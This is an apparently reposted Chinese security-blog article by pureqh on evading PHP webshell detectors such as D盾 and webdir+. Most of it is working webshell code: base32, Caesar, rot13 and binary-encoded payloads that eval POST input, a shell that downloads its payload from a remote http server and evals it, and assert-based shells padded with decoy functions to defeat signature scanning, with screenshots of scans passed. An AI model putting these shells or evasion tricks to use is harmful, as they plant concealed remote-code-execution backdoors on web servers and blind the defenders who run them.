> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/XCVucjaGkyScFF1UHg0y2A)

**0x00：前言**

由于杀软的规则在不断更新 所以很多之前的过杀软方法基本上都不行了 而且随着 php7 逐渐扩张 assert 马也将被淘汰 所以本文将提出几种免杀思路 效果很好 而且不会被杀软的正则和沙盒规则约束。

**0x01：自定义加密 Bypass**

部分杀软会直接将一些编码函数如 Base64、编码后的关键字或组合函数加入了规则 比如某 dir+  
![](https://mmbiz.qpic.cn/mmbiz_png/bMyibjv83iavzP8tGlJ0LAqI5btOXNcjZyrib5CqUA8Jiah8iaDLQexczn6MrIQAoJr8icia3cuoMB4mWIRrBL0Lohe4g/640?wx_fmt=png)  
比如这个 都能被检测出是 shell

所以为了防止这种的规则 自定义加密显然是最优解

自定义加密可选性多了 只要能把加密后的字符还原回去就行 比如 base32 base58 这类的 base 编码全家桶 或者自定义 ascii 移位 甚至是对称加密算法等都是可以绕过这类规则检测

*   base32 编码 payload  
    （https://github.com/pureqh/webshell）：
    
    ```
    <?php
    class KUYE{
          public $DAXW = null;
          public $LRXV = null;
          function __construct(){
          $this->DAXW = 'mv3gc3bierpvat2tkrnxuzlsn5ossoy';
          $this->LRXV = @SYXJ($this->DAXW);
          @eval("/*GnSpe=u*/".$this->LRXV."/*GnSpe=u*/");
          }}
    new KUYE();
    function MNWK($QSFX){
      $BASE32_ALPHABET = 'abcdefghijklmnopqrstuvwxyz234567';
      $NLHB = '';
      $v = 0;
      $vbits = 0;
      for ($i = 0, $j = strlen($QSFX); $i < $j; $i++){
      $v <<= 8;
          $v += ord($QSFX[$i]);
          $vbits += 8;
          while ($vbits >= 5) {
              $vbits -= 5;
              $NLHB .= $BASE32_ALPHABET[$v >> $vbits];
              $v &= ((1 << $vbits) - 1);}}
      if ($vbits > 0){
          $v <<= (5 - $vbits);
          $NLHB .= $BASE32_ALPHABET[$v];}
      return $NLHB;}
    function SYXJ($QSFX){
      $NLHB = '';
      $v = 0;
      $vbits = 0;
      for ($i = 0, $j = strlen($QSFX); $i < $j; $i++){
          $v <<= 5;
          if ($QSFX[$i] >= 'a' && $QSFX[$i] <= 'z'){
              $v += (ord($QSFX[$i]) - 97);
          } elseif ($QSFX[$i] >= '2' && $QSFX[$i] <= '7') {
              $v += (24 + $QSFX[$i]);
          } else {
              exit(1);
          }
          $vbits += 5;
          while ($vbits >= 8){
              $vbits -= 8;
              $NLHB .= chr($v >> $vbits);
              $v &= ((1 << $vbits) - 1);}}
      return $NLHB;}
    ?>
    ```
    
    ![](https://mmbiz.qpic.cn/mmbiz_png/bMyibjv83iavzP8tGlJ0LAqI5btOXNcjZyOyHNbez6DSJibON96gjhApFQ1YRJVKEZMOmYbJT0QAYK9MQzapjDWWg/640?wx_fmt=png)
    
*   ascii 码移位 payload（凯撒加密）
    
    ```
    <?php
    class FKPC{
          function __construct(){
          $this->TQYV = "bs^i%!\MLPQXwbolZ&8";
          $this->WZDM = @HHGJ($this->TQYV);
          @eval("/*#jkskjwjqo*/".$this->WZDM."/*sj#ahajsj*/");
          }}
    new FKPC();
    function HHGJ($UyGv) {
    $svfe = [];
    $mxAS = '';
    $f = $UyGv;
    for ($i=0;$i<strlen($f);$i++)
    {
      $svfe[] = chr((ord($f[$i])+3));
    }
    $mxAS = implode($svfe);
    return $mxAS ;
    }
    ?>
    ```
    
    ![](https://mmbiz.qpic.cn/mmbiz_png/bMyibjv83iavzP8tGlJ0LAqI5btOXNcjZyYNlzJhc2ULtEpakNa1WlXQdiaCoouRxXS9XeYQ1P6w7ogPBzxDvGOxw/640?wx_fmt=png)
    

居然没过 webdir+

那如何解决呢 我们后面再说 当然应付 D 盾还是绰绰有余了  
![](https://mmbiz.qpic.cn/mmbiz_png/bMyibjv83iavzP8tGlJ0LAqI5btOXNcjZyB1IpAv45xKG7Uu1LxN6VsM7X2zKSrkLib1Iy9PsvtrP6gx8NjS1zeMg/640?wx_fmt=png)  
Rot13 加密 payload

```
<?php

class KUYE{
        public $DAXW = null;
        public $LRXV = null;
        function __construct(){
        $this->DAXW = 'riny($_CBFG[mreb]);';
        $this->LRXV = @str_rot13($this->DAXW);
        @eval("/*GnSpe=u*/".$this->LRXV."/*GnSpe=u*/");
        }}
new KUYE();

?>
```

二进制转化 payload

```
<?php

class KUYE{
        public $DAXW = null;
        public $LRXV = null;
        function __construct(){
        $this->DAXW = '1100101 1110110 1100001 1101100 101000 100100 1011111 1010000 1001111 1010011 1010100 1011011 1111010 1100101 1110010 1101111 1011101 101001 111011';
        $this->LRXV = @BinToStr($this->DAXW);
        @eval("/*GnSpe=u*/".$this->LRXV."/*GnSpe=u*/");
        }}
new KUYE();
function BinToStr($str){
    $arr = explode(' ', $str);
    foreach($arr as &$v){
        $v = pack("H".strlen(base_convert($v, 2, 16)), base_convert($v, 2, 16));
    }

    return join('', $arr);
}
?>
```

![](https://mmbiz.qpic.cn/mmbiz_png/bMyibjv83iavzP8tGlJ0LAqI5btOXNcjZyCZBibGEfpznZa6Z7aKVWL0MmtYr23ZHEKHBPLm41vRWvyXLc05iaRWGg/640?wx_fmt=png)  
这里就不列举了 只要方法正确 绕过杀软是很简单的

**0x02：通过 http 获得关键参数**

上面那个凯撒密码不是被 webdir + 杀了吗 我们在这里将他绕过

众所周知凯撒密码需要设置往前或往后移几位 ascii 这个参数可以设置为解密方法的输入参数 经过测试 此参数在源码中会被沙盒跑出了 因此不能过百度杀毒 ，那么 我不写本地不就行了 我直接起一个 http 服务访问文本获得参数值。

```
<?php
class FKPC{
        function __construct(){
        $url = "http://xxxxx:8080/1.txt";
        $fp = fopen($url, 'r');
        stream_get_meta_data($fp);
        while (!feof($fp)) {
            $body.= fgets($fp, 1024);
        }
        $this->x = $body;
        $this->TQYV = "bs^i%!\MLPQXwbolZ&8";
        $this->WZDM = @HHGJ($this->TQYV,$this->x);
        @eval("/*#jkskjwjqo*/".$this->WZDM."/*sj#ahajsj*/");
        }}
new FKPC();

function HHGJ($UyGv,$x) {
$svfe = [];
$mxAS = '';
$f = $UyGv;
for ($i=0;$i<strlen($f);$i++)
{
    $svfe[] = chr((ord($f[$i])+$x));
}
$mxAS = implode($svfe);
return $mxAS ;
}
?>
```

![](https://mmbiz.qpic.cn/mmbiz_png/bMyibjv83iavzP8tGlJ0LAqI5btOXNcjZyDUAOe7M9o0ia8bMekQq7hdQaL6RFQEEYgZEngQ6Lg1qDopibqE2XraYA/640?wx_fmt=png)  
当然肯定能用

![](https://mmbiz.qpic.cn/mmbiz_png/bMyibjv83iavzP8tGlJ0LAqI5btOXNcjZyvaJicQg4IuU14IyYJaw68yUwRvtQbO4GhWLQE4ibVf5XTgtj8xEV0NMg/640?wx_fmt=png)

但是 这转了一圈简直不低碳啊 我不能直接 http 获取 payload 吗 ...  

简化代码：

```
<?php
class KUYE{
        public $a = 'yshasaui';
        public $b = '';
        function __construct(){
        $url = "http://xxx/1.txt";
        $fp = fopen($url, 'r');
        stream_get_meta_data($fp);
        while (!feof($fp)) {
            $body.= fgets($fp, 1024);
        }
        $this->b = $body;
        @eval("/*GnSpe=121u*/".$this->b."/*Gn212Spe=u*/");
        }}
new KUYE();
?>
```

![](https://mmbiz.qpic.cn/mmbiz_png/bMyibjv83iavzP8tGlJ0LAqI5btOXNcjZyaNOZmHianLic6uiabSr0XVicZFAhL0H853xKtQZacSvDib9rEjaIpnpFchA/640?wx_fmt=png)  
![](https://mmbiz.qpic.cn/mmbiz_png/bMyibjv83iavzP8tGlJ0LAqI5btOXNcjZygqGeFtYibtlPmL2yXs544UwiahdkJj0yMId9nIYV8cYOU0pN0l2LQE1g/640?wx_fmt=png)  
**0x03：重写函数 Bypass**

众所周知 正则类杀软最喜欢直接把危险函数加入规则 那么 它杀的是函数名 还是逻辑呢？

试一试就知道了

我们的样本如下：

```
<?php

$a = substr("assertxx",0,6);

$a($_POST['x']);

?>
```

这是个使用 substr 函数切割关键字的小马

直接扔到 webdir + 杀  
![](https://mmbiz.qpic.cn/mmbiz_png/bMyibjv83iavzP8tGlJ0LAqI5btOXNcjZyhM67hRqOibcV1m1PRKY0Nz4eLUfsIcxDe6zqIg1WxCVtcvfXrpzO6AA/640?wx_fmt=png)  
毫无疑问的被杀了

那么 我们重写 substr 函数

```
function mysubstr($string, $start = 0, $length = null) {
    $result = '';
    $strLength = strlen($string);
    if ($length === null) {
        $length = $strLength;
    }
    $length = (int) $length;
    $start = $start < 0 ? ($strLength + $start) : ($start);
    $end = $length < 0 ? ($strLength + $length) : $start + $length;
    if ($start > $strLength || ($end - $start) === 0) {
        return $result;
    }
    for (; $start < $end; $start ++) {
        $result .= $string[$start];
    }
    return $result;
}
```

然后把函数替换

```
<?php
$b = 'assert(xyz@';
$c =  mysubstr($b,0,6);
$c($_POST['zero']);
function mysubstr($string, $start = 0, $length = null) {
    $result = '';
    $strLength = strlen($string);
    if ($length === null) {
        $length = $strLength;
    }
    $length = (int) $length;
    $start = $start < 0 ? ($strLength + $start) : ($start);
    $end = $length < 0 ? ($strLength + $length) : $start + $length;
    if ($start > $strLength || ($end - $start) === 0) {
        return $result;
    }
    for (; $start < $end; $start ++) {
        $result .= $string[$start];
    }
    return $result;
}
?>
```

再拿去杀  
![](https://mmbiz.qpic.cn/mmbiz_png/bMyibjv83iavzP8tGlJ0LAqI5btOXNcjZylmYTjRpJ6dBbUiaDoeiaZy424cVAX0j6HrLt0jaPN69kt5dOALvq1VXg/640?wx_fmt=png)  
结论很清楚了

再来 D 盾杀一下  
![](https://mmbiz.qpic.cn/mmbiz_png/bMyibjv83iavzP8tGlJ0LAqI5btOXNcjZy26AQMwHib3EhCiaNPicVNA1uB3KtXAPYrJxTzx2xLG5ItboWSkFiaoPcRg/640?wx_fmt=png)  
不错 报 2 级了 这就是沙盒型查杀和正则类查杀的明显区别 怎么过呢 用构造方法即可

```
<?php

class pure
{
  public $a = '';
  function __destruct(){

    assert("$this->a");
  }
}
$b = new pure;
$b->a = $_POST['zero'];
function mysubstr($string, $start = 0, $length = null) {
    $result = '';
    $strLength = strlen($string);
    if ($length === null) {
        $length = $strLength;
    }
    $length = (int) $length;
    $start = $start < 0 ? ($strLength + $start) : ($start);
    $end = $length < 0 ? ($strLength + $length) : $start + $length;
    if ($start > $strLength || ($end - $start) === 0) {
        return $result;
    }
    for (; $start < $end; $start ++) {
        $result .= $string[$start];
    }
    return $result;
}
?>
```

![](https://mmbiz.qpic.cn/mmbiz_png/bMyibjv83iavzP8tGlJ0LAqI5btOXNcjZyD9PIwOqNgkvLAViaGib9qSgEYKSGEPAP1GWF0RUroQTyKHKZlY696wuQ/640?wx_fmt=png)  
看到这里大家可能也很奇怪 这里都没用到 mysubstr 函数 放上去不是多此一举吗

不好意思 恰恰不是 我们可以去掉这个函数 用 D 盾杀一下

```
<?php

class pure
{
  public $a = '';
  function __destruct(){

    assert("$this->a");
  }
}
$b = new pure;
$b->a = $_POST['zero'];
?>
```

![](https://mmbiz.qpic.cn/mmbiz_png/bMyibjv83iavzP8tGlJ0LAqI5btOXNcjZyQKbohYV4dZCBfJ9Uf87Cyia72gpu7c6rFJG8ehibI2rg8sgzmYiaLXXxw/640?wx_fmt=png)  
怎么样 是不是很有趣

这里放这堆代码并不是为了真的用它 而是为了过 D 盾的特征查杀 所以放什么函数是无所谓的。

比如这样：

```
<?php

class pure
{
  public $a = '';
  function __destruct(){

    assert("$this->a");
  }
}
$b = new pure;
$b->a = $_POST['zero'];
function mysubstr($a,$b) {
    echo "?sasasjajksjka";
    echo "?sasasjajksjka";
    echo "?sasasjajksjka";
    echo "?sasasjajksjka";
    echo "?sasasjajksjka";
    echo "?sasasjajksjka";
    echo "?sasasjajksjka";
    echo "?sasasjajksjka";
}
?>
```

![](https://mmbiz.qpic.cn/mmbiz_png/bMyibjv83iavzP8tGlJ0LAqI5btOXNcjZyksWyLAQw0ekDZTMZEiakzlkP4b6UrAhyFwXC1FFiabNLAn2kTk6bWQlQ/640?wx_fmt=png)  
这里只介绍了重写 substr 函数 那么其他的函数可以吗 当然可以  

****0x04：写在后面**

只要思想不滑坡 方法总比困难多

作者：pureqh ，来源于先知社区。

公众号

**觉得不错点个 **“赞”**、“在看” 哦****![](https://mmbiz.qpic.cn/mmbiz_png/3k9IT3oQhT1YhlAJOGvAaVRV0ZSSnX46ibouOHe05icukBYibdJOiaOpO06ic5eb0EMW1yhjMNRe1ibu5HuNibCcrGsqw/640?wx_fmt=png)**